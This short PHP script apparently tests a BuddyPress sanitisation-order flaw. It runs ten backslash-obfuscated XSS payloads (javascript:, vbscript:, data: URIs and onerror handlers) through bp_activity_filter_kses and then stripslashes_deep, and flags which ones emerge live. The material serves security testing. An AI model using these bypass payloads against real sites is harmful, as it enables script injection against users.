<?php
error_reporting(E_ERROR|E_PARSE);
$payloads = array(
 'backslash_proto'   => '<a href="java\\script:alert(1)">x</a>',
 'multi_backslash'   => '<a href="\\j\\a\\v\\a\\s\\c\\r\\i\\p\\t:alert(1)">x</a>',
 'bs_before_colon'   => '<a href="javascript\\:alert(1)">x</a>',
 'bs_in_onerror'     => '<img src=x on\\error=alert(1)>',
 'bs_tag'            => '<img src=x \\onerror=alert(1)>',
 'plain_js'          => '<a href="javascript:alert(1)">x</a>',
 'plain_onerror'     => '<img src=x onerror=alert(1)>',
 'bs_quote_break'    => '<a title=\\"x\\" href="java\\script:alert(1)">x</a>',
 'data_uri_bs'       => '<a href="dat\\a:text/html,<script>alert(1)</script>">x</a>',
 'vbscript_bs'       => '<a href="vb\\script:alert(1)">x</a>',
);
printf("%-18s | %-46s | %s\n", 'case', 'after bp_activity_filter_kses (prio 1)', 'after stripslashes_deep (prio 5)');
echo str_repeat('-',130)."\n";
foreach($payloads as $k=>$p){
  $after_kses = bp_activity_filter_kses($p);
  $after_strip = stripslashes_deep($after_kses);
  $danger = preg_match('/javascript:|vbscript:|data:text\/html|on[a-z]+\s*=/i', $after_strip);
  printf("%-18s | %-46s | %s %s\n", $k, substr($after_kses,0,46), substr($after_strip,0,46), $danger?'  *** LIVE ***':'');
}
